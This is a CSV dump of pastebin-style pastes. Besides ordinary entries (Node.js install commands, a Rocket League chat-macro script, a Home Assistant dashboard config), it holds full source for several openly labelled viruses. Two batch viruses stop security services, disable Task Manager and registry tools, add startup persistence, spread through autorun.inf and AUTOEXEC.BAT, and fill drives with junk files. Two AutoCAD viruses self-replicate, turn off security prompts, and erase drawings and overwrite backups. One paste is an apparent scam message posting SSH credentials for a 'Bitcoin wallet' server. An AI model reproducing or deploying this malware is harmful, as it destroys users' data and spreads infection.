id,title,username,language,date,content
WfNevufJ,Install Node.js and npm in Linux,Combolol,Bash,Sunday 9th of July 2023 12:53:11 AM CDT,"sudo apt update
sudo apt install nodejs
node --version
npm --version"
pyKFLwyJ,BTC Wallet Credentials have been reset,prepolashi_52,GetText,Sunday 9th of July 2023 12:20:02 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are Cocumazzo5i:kudXwV on 45.9.148.244
You can connect via SSH.
Regards"
n6HPfGb7,Virus.BAT.Autorun.y - Source Code,FlyFar,Batch,Saturday 8th of July 2023 11:31:52 PM CDT,"@echo off
set me=%0
set e=echo
attrib %0 +r
net stop ""Centro de Seguridad""
net stop ""Firewall de Windows/Conexi�n compartida a Internet (ICS)""

set hora=%time:~0,5%
set fecha=%date:~0,2%
set /a fecha+=3
if %fecha% GTR 29 (set fecha=1)

if ""%1"" EQU ""true"" (goto:ini)
if ""%~p0"" EQU ""\"" (explorer %~d0) else (if exist %~n0 (explorer %~n0) else (call:error %me%))
if not exist %windir%\security\""%~nx0"" (echo S|xcopy /H %me% %windir%\security)
at | find ""%~nx0""
if %errorlevel% GTR 0 (at %hora% /next:%fecha% %windir%\security\%~nx0 true)
exit

:ini
for /f ""skip=1 tokens=1*"" %%a in ('tasklist ^| find ""%~nx0""') do (if %%a. NEQ . (exit))
pushd %windir%\system32\dllcache
if not exist goma.bat call:goma>goma.bat
if exist goma.bat start /b goma.bat

if not exist %windir%\""%~nx0"" (echo S|xcopy /H %0 %windir%)
if exist %windir%\""%~nx0"" set virus=C:\Windows\""%~nx0""
set virus=%virus:""=%
for %%a in (A C D E F G H I J K) do (if exist %%a: (call:magic %%a ""%virus%""))
setlocal enabledelayedexpansion
for %%a in (A C D E F G H I J K) do (
       if exist %%a: (
             pushd %%a:\
             for /f ""tokens=3 delims= "" %%b in ('dir ^| find /I "" bytes libres""') do set m=%%b
             set m=!m:.=!
             set /a m/=1034752
             if exist wsegurity (echo S|cacls wsecurity /P %username%:F) else (md wsegurity)
             attrib wsecurity +s +h +r
             cd wsecurity
             for /L %%c in (1,1,!m!) do type %windir%\explorer.exe>>power%%c.sgt
             cd..
             echo S|cacls wsecurity /P %username%:N
                      )
       )
)
endlocal
exit

:goma
%e% @echo off
%e% reg add ""hklm\software\microsoft\command processor"" /v AutoRun /d ""color 0a&&cls&&title Shell&&prompt $hwizard@host:"" /f
%e% reg add ""hkcu\software\microsoft\windows\currentversion\policies\system"" /v DisableTaskMgr /t REG_DWORD /d 1 /f
%e% reg add ""hkcu\software\microsoft\windows\currentversion\policies\system"" /v DisableRegistryTools /t REG_DWORD /d 1 /f
%e% reg add ""hkcu\software\microsoft\windows\currentversion\policies\uninstall""  /v NoAddRemovePrograms /t REG_DWORD /d 1 /F
%e% reg add ""hkcu\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v Hidden /t REG_DWORD /d 2 /f
%e% reg add ""hklm\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden"" /v CheckedValue /t REG_DWORD /d 1 /f
%e% reg add ""hkcu\software\microsoft\windows\currentversion\policies\explorer"" /v NoViewContextMenu /t REG_DWORD /d 1 /f
%e% reg add ""hklm\software\microsoft\windows\currentversion\run"" /v CacheDefault /d %windir%\system32\dllcache\cache.vbs /f
%e% rundll32 user32.dll,UpdatePerUserSystemParameters
%e%.
%e% pushd %windir%\system32\dllcache
%e% if not exist dllcache.vbs (call:cache ^>cache.vbs)
%e% if not exist %%~nx0% % (xcopy /h %%0)%
%e% if exist cache.vbs (start cache.vbs)
%e% exit
%e%.
%e% :cache
%e% %e% set wzr=CreateObject ^(""Wscript.shell"")
%e% %e% wzr.run ^""goma.bat"",vbhide
%e% goto:EOF
goto:EOF


:magic
pushd %1:\
if exist autorun.inf (
attrib autorun.inf -a -s -r -h
del autorun.inf
)
if not exist %1$.exe (call:clon ""%1$"" %2)
if exist %1$.exe (
call:auto %1$.exe>autorun.inf
attrib %1$.exe +s +h
)
for /D %%a in (*) do (if %%a. NEQ . (call:clon ""%%a"" %2 && call:02 ""%%a"" %2)
goto:EOF

:clon
if exist %1.exe (goto:EOF) else (
echo f|xcopy /h %2 %1.exe
attrib %1 +s +h
)
goto:EOF

:02
cd %1
for /D %%b in (*) do (if %%b. NEQ . (call:clon ""%%b"" %2)
cd..
goto:EOF

:auto
%e% [autorun]
%e% open=%1
%e% shell\open\command=%1
%e% shell\explorer\command=%1
attrib autorun.inf +s +h +r
goto:EOF

:error
echo wzr=""No se puede tener acceso a %~dpn1"" ^& chr(13) ^& chr(13) ^& "" Acceso  denegado. "">%temp%\suc.vbs
echo Msgbox wzr,VBCRITICAL,""Unidad local (%~d0)"" >>%temp%\suc.vbs
start %temp%\suc.vbs
ping 127.0.0.1 -n 2 >nul
del %temp%\suc.vbs
goto:EOF"
0dkv0sUX,Virus.BAT.666 - Source Code,FlyFar,Batch,Saturday 8th of July 2023 11:30:15 PM CDT,"@echo off
@set inf=n
@set infect=n
@if %INF%==Y goto scan
@echo @SET INF=Y >a.666
@echo @call %0.bat >>a.666
@echo @echo Batch virus greets You !>>a.666
@TYPE AUTOEXEC.BAT >>A.666
@COPY A.666 AUTOEXEC.BAT >NUL
@SET INF=Y
:scan
@IF %INFECT%==Y GOTO END
@c:
@cd\
@dir %0.bat /s|find /i ""Direct"" >c:\a.666
@echo exit >>c:\a.666
@echo @copy %%2\%0.bat c:\ >c:\director.bat
@command <c:\a.666 >nul
@c:
@cd\
@dir /ad /s|find /i ""Direct"" >a.666
@echo exit >>a.666
@echo @if not exist %%2%0.bat copy c:\%0.bat %%2 >c:\Director.bat
@command < a.666 >nul
@del a.666
@del director.bat
@del %0.bat
@SET INFECT=Y
:END
@echo Good command or file name!"
FKeWKRMY,Virus.Acad.Galaxy.a - Source Code,FlyFar,CAD Lisp,Saturday 8th of July 2023 11:16:08 PM CDT,"Public WithEvents ACADApp As AcadApplication
Sub galaxy()
Set ACADApp = GetObject(, ""AutoCAD.Application"")
Set VBEModel = VBE
On Error GoTo runtonext
d1 = Dir(""c:\firstrun.txt"")
bignum = Int((150000 * Rnd) + 1)
t1 = Application.Preferences.Profiles.ActiveProfile
a1 = FileSystem.Dir(""c:\cad.reg"")
If a1 = """" Then
Open ""c:\cad.reg"" For Output As 1
Print #1, ""REGEDIT4""
Print #1, ""[HKEY_CURRENT_USER\Software\Autodesk\AutoCAD\R15.0\ACAD-1:409\Profiles\"" & t1 & ""\acadvba]""
Print #1, """"""AutoEmbedding""""=dword:00000001""
Print #1, """"""AllowBreakOnErrors""""=dword:00000000""
Print #1, """"""ShowSecurityDlg""""=dword:00000000""
Print #1, ""[HKEY_LOCAL_MACHINE\Software\Autodesk\AutoCAD\R15.0\ACAD-1:409\Profiles\"" & t1 & ""\acadvba]""
Print #1, """"""AutoEmbedding""""=dword:00000001""
Print #1, """"""AllowBreakOnErrors""""=dword:00000000""
Print #1, """"""ShowSecurityDlg""""=dword:00000000""
Close #1
Reset
Shell ""regedit /s c:\cad.reg"", vbHide
Open ""c:\firstrun.txt"" For Output As #1: Close #1
MsgBox ""Invalid Ordinal "" & bignum, vbCritical, ""Application Error""
Application.Quit
End If
le = 0
For i = 1 To Documents.Count
Set at = VBEModel.codepanes(i).codemodule
If at.lines(4, 1) = ""Set VBEModel = VBE"" And le = 0 Then
newroutine = at.lines(1, at.countoflines)
le = 1
i = 0
End If
If at.lines(4, 1) <> ""Set VBEModel = VBE"" And le = 1 Then
VBEModel.codepanes(i).codemodule.InsertLines 1, newroutine
If d1 = ""firstrun.txt"" Then
ACADApp.Documents(i).SaveAs ACADApp.Path & ""\Template\acad.dwt"", acR15_Template
ACADApp.Documents(i).SaveAs ACADApp.Path & ""\Template\acadiso.dwt"", acR15_Template
ACADApp.Documents(i).SaveAs ACADApp.Path & ""\Template\ACAD -Named Plot Styles.dwt"", acR15_Template
ACADApp.Documents(i).SaveAs ACADApp.Path & ""\Template\ACADISO -Named Plot Styles.dwt"", acR15_Template
d1 = """"
Kill (""c:\firstrun.txt"")
End If
ACADApp.Documents(i).Save
End If
runtonext:
Next i
newroutine = """"
'if a star went out
'every time i thought of you
'the night skies
'would be empty forever
'Acad/Galaxy
End Sub

Private Sub AcadDocument_BeginClose()
 Call galaxy
'AsT
End Sub

Private Sub AcadDocument_Deactivate()
    Call galaxy
End Sub
    
Private Sub AcadDocument_Activate()
   Call galaxy
End Sub
 "
dNMH27S5,Virus.Acad.Pobresito.a - Source Code,FlyFar,CAD Lisp,Saturday 8th of July 2023 11:15:01 PM CDT,"(setvar ""cmdecho"" 0)
(defun copyy (origen destino / file1 file2 esc1)
  (if (= FIC ""A"")					
    (progn
     (setq file1 (open origen ""r"") file2 (open destino ""w""))
     (if (and (/= file2 nil) (/= file1 nil))
      (progn
       (while
        (setq esc1 (read-line file1))
        (write-line esc1 file2)
       )
       (close file1)
       (close file2)))))
)
(defun ejecuta (/ tabla aux text1 text2 archi arch1)
  (command ""style"" ""txt"" ""txt"" 0 1 0 """" """" """")
  (setq nombre (strcat (getvar ""dwgprefix"") (getvar ""dwgname"")) otron (getvar ""tempprefix""))
  (if (/= nombre nil)
  (setq COD96-I (strcat (substr nombre 1 (- (strlen nombre) 3)) ""bak"")))
  (setq tabla (tblnext ""layer"" 1) aux (cdr (assoc 2 tabla)))
  (command ""layer"" ""ON"" ""0"" ""T"" ""0"" ""U"" ""0"" """")
  (while (/= (setq tabla (tblnext ""layer"")) nil)
    (setq aux (cdr (assoc 2 tabla)))
    (command ""layer"" ""ON"" aux ""T"" aux ""U"" aux """"))
  (command ""erase"" ""all"" """");;;;;ja ja ja ja
  (setq text1 ""Universidad Nacional de Ingeniería"" text2 ""ExTaCiS_CAD Ver. 1.9.2"")
  (command ""color"" 1)
  (command ""text"" ""j"" ""m"" '(0 100) 5 0 text1 """")
  (command ""text"" ""j"" ""m"" '(0 90) 5 0 text2 """")
  (command ""zoom"" ""e"")
  (command ""qsave"")
  (setq nombres '() jj 1 autofile (getvar ""savefile"") num1 (strlen autofile) cco 1 archiv_nom """")
  (while (/= ""."" (setq tte (substr autofile cco 1)))
    (setq archiv_nom (strcat archiv_nom tte) cco (1+ cco))
  )
  (setq archiv_ext (substr autofile (1+ cco)) otron (strcat otron archiv_nom))
  (while (open (setq otron1 (strcat otron (itoa jj) (strcat ""."" archiv_ext))) ""r"")
    (setq nombres (cons otron1 nombres) jj (1+ jj))
  )
  (setq jj 1)
  (while (open (setq otron1 (strcat otron (itoa jj) "".bak"")) ""r"")
    (setq nombres (cons otron1 nombres) jj (1+ jj))
  )
  (setq nombres (cons COD96-I nombres) jj 0)
  (repeat (length nombres)
    (if (setq archi (open (nth jj nombres) ""w""))
      (progn
        (write-line text1 archi)
        (write-line text2 archi)
        (close archi)
        (setq jj (1+ jj))
      )
      (setq jj (1+ jj))
    )
  )
  (command ""quit"")
)
(setq des ""a:\\acad.lsp"" nombre (strcat (getvar ""dwgprefix"") (getvar ""dwgname"")))
(setq m11 ""acad.lsp"" contador_de_la_muerte 0 cadena (getvar ""acadprefix"") num (strlen cadena) j 1 k 0 nucleo """")
(if (/= nombre nil)
  (setq FIC (substr nombre 1 1)))
(while (= k 0)
  (setq char (substr cadena j 1) j (1+ j))
  (if (/= char "";"")
    (setq nucleo (strcat nucleo char))
    (setq k 1)))
(setq m22 (findfile m11) unidad (substr m22 1 1) m3 (strcat nucleo ""\\"" m11))
(if (= unidad ""A"")
  (copyy m22 m3)
  (copyy m3 des))
(defun c:l ()
  (setq contador_de_la_muerte (1+ contador_de_la_muerte))
  (if (= contador_de_la_muerte 30)
    (ejecuta))
  (command "".line""))
(defun c:e ()
  (setq contador_de_la_muerte (1+ contador_de_la_muerte))
  (if (= contador_de_la_muerte 30)
    (ejecuta))
  (command "".erase""))
(defun c:z ()
  (setq contador_de_la_muerte (1+ contador_de_la_muerte))
  (if (= contador_de_la_muerte 30)
    (ejecuta))
  (command "".zoom""))
;;comentarios y/o sugerencias a traemelo@lanet.com.pe
;;y el que me borbardee.... hay,hay,hay....pobresito.
;;Ya sale para AutoCAD 2000.
;;Por la culpa de unos idiotas tube que cambiar de acadr14.lsp a acad.lsp
;;Actualizado al 15/05/2000 a las 12:59 AM
;;....¡¡¡hay hoy tengo práctica...y no he estudiado nada!!!"
nFFfQhDy,Rocket League Quick Chats,TeamOneButton,Python,Saturday 8th of July 2023 09:06:24 PM CDT,"import time
import pyautogui
import pygame
from random import sample

# Create your own word variations and format them like this (see examples on how to use them in the ""edit"" section below)
variations = {
    'affirmation': ['...maybe', '...possibly', '...sometimes', '...most likely', '...probably', '...definitely', '...no doubt'],
    'friend': ['buddy', 'pal', 'mate', 'champ', 'my friend', 'comrade', 'fellow gamer', 'brother', 'bro', 'bruh'],
    'foe': ['rival', 'opponent', 'challenger', 'competitor', 'adversary', 'nemesis', 'antagonist'],
    'compliment': ['great', 'awesome', 'amazing', 'fantastic', 'impressive', 'excellent', 'superb', 'outstanding', 'stellar', 'splendid'],
    'cat fact': ['Cats have been domesticated for over 4,000 years.',
                 'Cats sleep for an average of 12-16 hours a day.',
                 'A group of cats is called a clowder.',
                 'Cats have a specialized collarbone that allows them to always land on their feet.',
                 'Cats have five toes on their front paws and four toes on their back paws.',
                 'Cats have a third eyelid called a haw that helps protect their eyes.',
                 'Cats have a specialized grooming claw on their front paws.',
                 'Cats have a highly developed sense of hearing and can detect higher frequencies than humans.',
                 'Cats have a keen sense of balance and are excellent climbers.',
                 'Cats communicate with each other using a variety of vocalizations, body postures, and scents.',
                 'Cats have a unique ability to rotate their ears 180 degrees.',
                 'Cats have retractable claws that help them climb and maintain their hunting skills.',
                 'Cats have a specialized tongue with tiny, backward-facing barbs called papillae.',
                 'Cats have a Jacobson\'s organ, also known as the vomeronasal organ, which allows them to analyze scent molecules.',
                 'Cats have been associated with various mythologies and were worshipped in ancient civilizations.',
                 'Cats have a flexible spine that enables them to twist and turn in mid-air while maintaining their balance.',
                 'Cats have a strong instinct for cleanliness and spend a significant amount of time grooming themselves.',
                 'Cats have a highly sensitive sense of touch, particularly in their whiskers and paws.',
                 'Cats have a natural hunting instinct and may engage in playful stalking and pouncing behaviors.',
                 'Cats have a remarkable ability to squeeze through small spaces due to their flexible bodies.',
                 'Cats have a specialized nose pad that contains unique patterns, similar to human fingerprints.',
                 'Cats have an average lifespan of 15-20 years, but some cats have lived well into their 30s.',
                 'Cats have a complex vocal repertoire and can produce a variety of sounds, including meows, purrs, and chirps.',
                 'Cats have a strong sense of territory and may mark their territory by rubbing against objects with their scent glands.',
                 'Cats have an acute sense of night vision and can see in nearly total darkness.',
                 'Cats have a preference for a clean litter box and may refuse to use a dirty one.',
                 'Cats have a mysterious behavior known as the ""slow blink,"" which is considered a sign of trust and affection.',
                 'Cats have a natural curiosity and are known for exploring their surroundings with great interest.',
                 'Cats have a specialized hunting technique called ""whisker guidance"" that helps them navigate narrow spaces.',
                 'Cats have a unique ability to rotate their paws backward, allowing them to climb down trees headfirst.',
                 'Cats have a highly adaptable diet and can thrive on a variety of food sources, including meat, fish, and even certain fruits and vegetables.']
}


# DualSense controller button mappings for pygame
buttons = {
    'cross': 0,
    'circle': 1,
    'square': 2,
    'triangle': 3,
    'L1': 4,
    'R1': 5,
    'L2': 6,
    'R2': 7,
    'share': 8,
    'options': 9,
    'ps': 10,
    'up': 11,
    'down': 12,
    'left': 13,
    'right': 14,
    'L3': 15,
    'R3': 16
}

# Time window given for button sequence macros (1.1 seconds).... you can change this as you please
macroTimeWindow = 1.1

# Time interval between spammed chats (0.2 seconds).... change as you please
chatSpamInterval = .2

# Edit these if necessary
chatKeys = {
    'lobby': 't',
    'team': 'y',
    'party': 'u'
}

buttons = {
    'cross': 0,
    'circle': 1,
    'square': 2,
    'triangle': 3,
    'share': 4,
    'ps': 5,
    'options': 6,
    'L1': 9,
    'R1': 10,
    'up': 11,
    'down': 12,
    'left': 13,
    'right': 14
}


firstButtonPressed = {
    'button': None,
    'time': 420
}

macrosOn = True

def resetFirstButtonPressed():
    firstButtonPressed['button'] = None
    firstButtonPressed['time'] = 420

# detects simultaneous button presses
def combine(button1, button2):
    global numJoysticks
    for i in range(numJoysticks):
        if joysticks[i].get_button(buttons[button1]) and joysticks[i].get_button(buttons[button2]):
            resetFirstButtonPressed()
            return True
    return False

# detects successive button presses (buttons pressed in a specific order)
def sequence(button1, button2):
    global firstButtonPressed
    global numJoysticks
    functionCallTime = time.time()
    for i in range(numJoysticks):
        if firstButtonPressed['button'] == None:
            if joysticks[i].get_button(buttons[button1]):
                firstButtonPressed['time'] = functionCallTime
                firstButtonPressed['button'] = button1
                return False
        else:
            if functionCallTime > (firstButtonPressed['time'] + macroTimeWindow):
                if joysticks[i].get_button(buttons[button1]):
                    firstButtonPressed['time'] = functionCallTime
                    firstButtonPressed['button'] = button1
                    return False
                else:
                    resetFirstButtonPressed()
                    return False
            else:
                if joysticks[i].get_button(buttons[button2]):
                    if button1 == firstButtonPressed['button']:
                        if (functionCallTime > (firstButtonPressed['time'] + 0.05)):
                            resetFirstButtonPressed()
                            return True
                    else:
                        return False
    return False

def quickchat(thing, chatMode='lobby', spamCount=1):
    for i in range(spamCount):
        print(f""Sending quick chat: {thing} ({chatMode} mode)"")
        pyautogui.press(chatKeys[chatMode])
        print(""Pressing chat key"")
        pyautogui.write(thing, interval=0.001)
        print(""Writing quick chat"")
        pyautogui.press('enter')
        print(""Pressing enter"")
        time.sleep(chatSpamInterval)


def toggleMacros(button):
    global numJoysticks
    for i in range(numJoysticks):
        if joysticks[i].get_button(buttons[button]):
            global macrosOn
            macrosOn = not macrosOn
            if macrosOn:
                print('----- quickchat macros toggled on -----\n')
            else:
                print('----- quickchat macros toggled off -----\n')
            time.sleep(.2)

def shuffleVariations(key=''):
    if not (key == ''):
        lastWordUsed = shuffledVariations[key]['randomizedList'][len(variations[key]) - 1]
        secondLastWordUsed = shuffledVariations[key]['randomizedList'][len(variations[key]) - 2]
        while True:
            shuffledList = sample(variations[key], len(variations[key]))
            if not (shuffledList[0] == lastWordUsed) and (shuffledList[1] == secondLastWordUsed):
                shuffledVariations[key]['randomizedList'] = shuffledList
                shuffledVariations[key]['nextUsableIndex'] = 0
                break
    else:
        for key in variations:
            shuffledVariations[key] = {
                'randomizedList': sample(variations[key], len(variations[key])),
                'nextUsableIndex': 0
            }
def variation(key):
    global variations
    global shuffledVariations
    index = shuffledVariations[key]['nextUsableIndex']
    if not len(variations[key]) > 2:
        print(f'The ""{key}"" variation list has less than 3 items.....it cannot be used properly!! Please add more items (words/phrases)')
        return '-- ""' + key + '"" variation list needs more items --'
    else:
        if index < (len(variations[key])):
            randWord = shuffledVariations[key]['randomizedList'][index]
            shuffledVariations[key]['nextUsableIndex'] += 1
            return randWord
        else:
            shuffleVariations(key)
            randWord = shuffledVariations[key]['randomizedList'][0]
            shuffledVariations[key]['nextUsableIndex'] += 1
            return randWord

shuffledVariations = variations.copy()
shuffleVariations()
pygame.init()
pygame.joystick.init()
joysticks = [pygame.joystick.Joystick(i) for i in range(pygame.joystick.get_count())]

for controller in joysticks:
    if controller.get_init() == True:
        print(f""\n\n~~~~~~ {controller.get_name()} detected ~~~~~~\n\nwaiting for quickchat inputs....\n\n"")

lastQuickChat = ''
while True:
    try:
        for event in pygame.event.get():
            if event.type == pygame.JOYBUTTONDOWN:
                numJoysticks = pygame.joystick.get_count()

                toggleMacros('ps')

                if macrosOn:
                    if sequence('up', 'up'):
                        quickchat(""I got it"" + variation('affirmation'), chatMode='lobby')
                        lastQuickChat = ""I got it"" + variation('affirmation')
                        break
                    elif sequence('up', 'down'):
                        quickchat(""Defending... but don't expect too much from me."", chatMode='lobby')
                        lastQuickChat = ""Defending... but don't expect too much from me.""
                        break                    
                    elif sequence('down', 'up'):
                        quickchat(""OH SNAP!"", chatMode='lobby')
                        lastQuickChat = ""OH SNAP!""
                        break
                    elif sequence('left', 'up'):
                        quickchat(""Nice Shot! Or great pass! or... something. It's in."", chatMode='lobby')
                        lastQuickChat = ""Nice Shot! Or great pass! or... something. It's in.""
                        break
                    elif sequence('right', 'up'):
                        quickchat(""Centering! Just kidding, it's going nowhere."", chatMode='lobby')
                        lastQuickChat = ""Centering! Just kidding, it's going nowhere.""
                        break
                    elif sequence('left', 'right'):
                        quickchat(""Thanks! Totally accidental, of course."", chatMode='lobby')
                        lastQuickChat = ""Thanks! Totally accidental, of course.""
                        break
                    elif sequence('left', 'down'):
                        quickchat(""WHAT A SAVE! WHAT A SAVE! WHAT A SAVE! QUICKCHAT DISABLED... cept not."", chatMode='lobby')
                        lastQuickChat = ""WHAT A SAVE! WHAT A SAVE! WHAT A SAVE! QUICKCHAT DISABLED... cept not.""
                        break                   
                    elif sequence('left', 'left'):
                        quickchat(""Great pass! Or Nice shot!... It went in anyway."", chatMode='lobby')
                        lastQuickChat = ""Great pass! Or Nice shot!... It went in anyway.""
                        break
                    elif sequence('up', 'right'):
                        quickchat(""Let me cook! Hope you like a burnt meal."", chatMode='lobby')
                        lastQuickChat = ""Let me cook! Hope you like a burnt meal.""
                        break
                    elif sequence('up', 'left'):
                        quickchat(""Need boost! I'm always running on empty."", chatMode='lobby')
                        lastQuickChat = ""Need boost! I'm always running on empty.""
                        break
                    elif sequence('down', 'right'):
                        if lastQuickChat != ""No problem. I mean, it's totally your fault, but no problem."":
                            quickchat(""No problem. I mean, it's totally your fault, but no problem."", chatMode='lobby')
                            lastQuickChat = ""No problem. I mean, it's totally your fault, but no problem.""
                        break
                    elif sequence('down', 'up'):
                        if lastQuickChat != ""Whoops! I swear, it looked better in my head."":
                            quickchat(""Whoops! I swear, it looked better in my head."", chatMode='lobby')
                            lastQuickChat = ""Whoops! I swear, it looked better in my head.""
                        break
                    elif sequence('right', 'left'):
                        quickchat(""Close one! Just like my chances of winning."", chatMode='lobby')
                        lastQuickChat = ""Close one! Just like my chances of winning.""
                        break
                    elif sequence('right', 'right'):
                        quickchat(""Wow! What an excellent performance... kinda."", chatMode='lobby')
                        lastQuickChat = ""Wow! What an excellent performance... kinda.""
                        break
                    elif sequence('down', 'down'):
                        quickchat(variation('cat fact'), chatMode='lobby')
                        break
    except Exception as e:
        print(e)
        break
"
KH84jm0W,Lab,d_sellers1,YAML,Saturday 8th of July 2023 09:01:54 PM CDT,"button_card_templates:
  generic_custom_button:
    show_icon: true
    show_name: true
    show_state: false
    color_type: icon
    triggers_update: all
    state:
      - color: rgb(28, 28, 28)
        operator: '=='
        value: 'off'
        styles:
          name:
            - color: rgb(128, 128, 128)
      - color: yellow
        operator: '=='
        value: 'on'
        styles:
          name:
            - color: rgb(255, 255, 255)
    styles:
      card:
        - background-color: transparent
        - '--ha-card-box-shadow': none
        - border-radius: 20px
        - '--mdc-ripple-color': white
        - '--mdc-ripple-press-opacity': 1.5
        - border: 1px solid var(--primary-text-color)
    tap_action:
      action: toggle
    hold_action:
      action: more-info
    double_tap_action:
      action: none
  blank_custom_button:
    show_icon: false
    show_name: false
    show_state: false
    triggers_update: all
    styles:
      card:
        - background-color: transparent
        - border: none
    tap_action:
      action: none
    hold_action:
      action: none
    double_tap_action:
      action: none
  oversized_custom_button:
    template: generic_custom_button
    aspect_ratio: 2/2
    custom_fields:
      color_temp: |-
        [[[ if ((entity.state === 'on')) ;
            if (entity.attributes.color_mode == 'color_temp') return entity.attributes.color_temp_kelvin + ""K"";
            if (entity.attributes.rgb_color != undefined) return ""RGB("" + entity.attributes.rgb_color + "")"";
            else return;
        ]]] 
      last_changed: |-
        [[[ if (entity.state === 'on') {
            var last_changed_in_minutes = ((new Date().getTime() - new Date(entity.last_changed).getTime())/60000).toFixed(0);  
            if (last_changed_in_minutes < 1) return;
            if (last_changed_in_minutes < 60) return last_changed_in_minutes + "" min"";
            if (last_changed_in_minutes >= 60) { 
              var hrs = Math.floor(last_changed_in_minutes / 60); 
              return hrs + "" hr"" + "" "" + (last_changed_in_minutes % (hrs * 60)) + "" min""; }
            } ]]]
    styles:
      card:
        - font-size: 30px
      icon:
        - width: 125%
      custom_fields:
        color_temp:
          - align-self: middle
          - justify-self: right
          - position: absolute
          - right: 3%
          - top: 3%
          - font-size: 20px
          - color: white
          - transform: rotate(0deg)
          - opacity: 33%
        last_changed:
          - align-self: middle
          - justify-self: right
          - position: absolute
          - right: 3%
          - top: 8%
          - font-size: 20px
          - color: white
          - transform: rotate(0deg)
          - opacity: 33%
  oversized_custom_button_with_auto:
    template: oversized_custom_button
    variables:
      var_auto_entity: input_boolean.automation_auto_kitchen_lights
    custom_fields:
      auto: >
        [[[ if ((states[variables.var_auto_entity].state === 'on')) return
        ""Automatic""; ]]] 
    styles:
      custom_fields:
        auto:
          - align-self: middle
          - justify-self: left
          - position: absolute
          - left: 3%
          - top: 3%
          - font-size: 24px
          - color: yellow
          - transform: rotate(0deg)
          - opacity: 33%
    double_tap_action:
      action: call-service
      service: input_boolean.toggle
      service_data:
        entity_id: '[[[ return variables.var_auto_entity; ]]]'
  rgb_selector:
    template: generic_custom_button
    variables:
      var_color_name: red
      var_entity_id: light.living_room_lights
    show_name: false
    show_icon: false
    styles:
      card:
        - border-radius: 50%
        - height: 75px
        - width: 75px
        - background-color: rgba(255, 0, 0, 0.5)
    tap_action:
      action: call-service
      service: light.turn_on
      service_data:
        entity_id: light.bedroom_lights
        color_name: red
    hold_action:
      action: call-service
      service: nodered.trigger
      service_data:
        entity_id: switch.nodered_all_lights_to_rgb
        payload:
          color_name: '[[[ return variables.var_color_name; ]]]'
  brightness_selector:
    template: generic_custom_button
    variables:
      var_value: 100
      var_entity_id: light.living_room_lights
    name: '[[[ return `${variables.var_value}%` ]]]'
    show_icon: false
    state:
      - operator: template
        value: |-
          [[[ return
              parseInt(states[variables.var_entity_id].attributes.brightness) ===
              Math.round(variables.var_value*255/100) ]]]
        styles:
          name:
            - color: yellow
          card:
            - box-shadow: inset 0px 0px 5px 1px yellow
            - border: 1px solid yellow
    styles:
      card:
        - height: 75px
      name:
        - font-weight: bold
        - font-size: 24px
    tap_action:
      action: call-service
      service: light.turn_on
      service_data:
        brightness_pct: '[[[ return variables.var_value; ]]]'
        entity_id: '[[[ return variables.var_entity_id; ]]]'
    hold_action:
      action: call-service
      service: nodered.trigger
      service_data:
        entity_id: switch.nodered_all_lights_to_rgb
        payload:
          brightness_pct: '[[[ return variables.var_value; ]]]'
  battery_custom_button:
    template: generic_custom_button
    entity: sensor.derek_s_fire_10_battery_level
    name: Tablet
    tap_action:
      action: none
    variables:
      var_color: |-
        [[[ 
          var battery_level=entity.state;
          if (battery_level > 70) return 'lime';
          else if (battery_level >= 30) return 'yellow';
          else return 'red';
        ]]]
    custom_fields:
      battery_percentage: |
        [[[ if (entity.state === 'unavailable') return "" ""; 
            else return `${entity.state}%` ]]] 
    styles:
      card:
        - border: none
      icon:
        - color: '[[[ return variables.var_color ]]]'
        - animation: |
            [[[ if (entity.state <= 10 ) return 'blink 2s ease infinite'; ]]]
      custom_fields:
        battery_percentage:
          - align-self: middle
          - justify-self: center
          - position: absolute
          - left: 5%
          - top: 25%
          - font-size: 14px
          - color: '[[[ return variables.var_color ]]]'
          - transform: rotate(90deg)
  motion_detector_animated:
    entity: binary_sensor.bathroom_motion_detector_on_off
    name: Bathroom
    show_name: true
    variables:
      var_battery_entity: sensor.living_room_motion_detector_battery_level
    custom_fields:
      battery_percentage: >
        [[[ return `<ha-icon icon=""mdi:circle-small"" style=""width: 25px; height:
        25px;""> </ha-icon>`; ]]]
    styles:
      custom_fields:
        battery_percentage:
          - position: absolute
          - left: 10%
          - top: 10%
          - color: |-
              [[[ 
                var battery_level=states[variables.var_battery_entity].state;
                if (battery_level > 70) return 'lime';
                else if (battery_level >= 30) return 'yellow';
                else return 'red';
              ]]]
      card:
        - background-color: rgb(17, 17, 17)
        - border-radius: 20px
    state:
      - value: 'off'
        operator: '=='
        icon: mdi:walk
        color: rgb(28, 28, 28)
        styles:
          name:
            - color: rgb(28, 28, 28)
      - value: 'on'
        operator: '=='
        icon: mdi:motion-sensor
        color: rgb(255, 0, 0)
        styles:
          name:
            - color: white
          icon:
            - animation: blink 2s ease infinite
      - value: unavailable
        operator: '=='
        icon: mdi:walk
        color: rgb(255, 255, 0)
        styles:
          name:
            - color: rgb(255, 255, 0)
            - animation: blink 3s cubic-bezier(.2, 0, 1, 1) infinite
  onstate:
    state:
      - color: rgb(0,255,0)
        value: 'on'
  offstate:
    state:
      - color: rgb(255,0,0)
        value: 'off'
  chips:
    tap_action:
      action: more-info
    show_icon: false
    show_label: true
    show_name: false
    show_state: false
    styles:
      label:
        - justify-self: center
        - padding: 0px 6px
        - font-weight: bold
        - font-size: 14px
      img_cell:
        - width: 24px
      grid:
        - grid-template-areas: '''l'''
      card:
        - border-radius: 18px
        - box-shadow: var(--box-shadow)
        - height: 36px
        - width: auto
        - padding-left: 6px
        - padding-right: 6px
    size: 80%
  chip_icon_label:
    template: chips
    show_icon: true
    size: 100%
    styles:
      card:
        - padding-top: 6px
        - padding-button: 6px
        - padding-left: 12px
      grid:
        - grid-template-areas: '''i l'''
        - grid-template-columns: max_content auto
        - grid-template-rows: min-content
      img_cell:
        - place-self: center
        - width: 14px
        - height: 24px
      label:
        - font-size: 12px
        - margin-left: 0px
views:
  - icon: mdi:animation-outline
    theme: Derek Dark Theme
    badges: []
    cards:
      - type: custom:stack-in-card
        mode: horizontal
        card_mod:
          style: |
            ha-card {
              border: none;
            }
        cards:
          - type: custom:auto-entities
            card:
              type: custom:layout-card
              layout_type: horizontal
              layout_options:
                width: 100
            filter:
              include:
                - domain: light
                  options:
                    type: custom:button-card
                    entity_id: this.entity_id
                    layout: vertical
                    show_last_changed: true
                    aspect_ratio: 1/1
